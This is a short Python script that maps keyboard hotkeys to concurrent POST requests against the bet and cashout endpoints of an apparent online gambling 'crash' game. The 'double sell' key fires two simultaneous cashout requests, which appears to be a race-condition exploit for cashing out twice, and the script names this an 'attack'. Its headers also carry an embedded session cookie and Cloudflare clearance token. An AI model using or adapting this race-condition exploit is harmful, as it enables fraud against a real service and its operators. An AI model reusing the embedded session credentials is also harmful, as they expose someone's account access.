import requests
import threading
import keyboard

# --- ENDPOINTS & HEADERS ---
BUY_URL = "https://lfdiego.xyz/hub/api/games/lucky/crash/bet"  # Change if buy has a different endpoint
SELL_URL = "https://lfdiego.xyz/hub/api/games/lucky/crash/cashout" # Replace with your double sell endpoint when ready

HEADERS = {
    "Cookie": "hub_session=gNHyP2YUClIRnfJ2BHBCFMRn7YDrlZK3t3T-4ZMdTh8; cf_clearance=PKV_fHYAvSt2SR4v8cyAHtsvBMqTMWZJhdZiC68JvwU-1792178622...",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
}

def fire_request(action_name, target_url, payload, thread_count=2):
    print(f"\n[+] Key pressed! Firing {action_name} attack...")
    
    def blast(thread_id):
        try:
            response = requests.post(target_url, json=payload, headers=HEADERS)
            print(f"[-] [{action_name}] Thread {thread_id} Returned -> Status: {response.status_code} | Body: {response.text}")
        except Exception as e:
            print(f"[!] [{action_name}] Thread {thread_id} Network Error: {e}")

    threads = []
    for i in range(thread_count):
        t = threading.Thread(target=blast, args=(i + 1,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()
    print(f"Done with {action_name}. Standing by, my G.")

# Define the trigger functions for each key
def trigger_buy():
    fire_request("BUY", BUY_URL, {"amount": 1000, "target": None}, thread_count=1)

def trigger_double_sell():
    fire_request("DOUBLE SELL", SELL_URL, {})

# --- KEYBIND BINDINGS ---
# Press 'b' for Buy, 'n' for Double Sell
keyboard.add_hotkey('b', trigger_buy)
keyboard.add_hotkey('n', trigger_double_sell)

print("Yooo, dual hotkey listeners are live, on god!")
print(" -> Press 'b' to Buy")
print(" -> Press 'n' for Double Sell")
print(" -> Press 'esc' to exit completely.")

# Keep the script running to listen for keypresses
keyboard.wait('esc')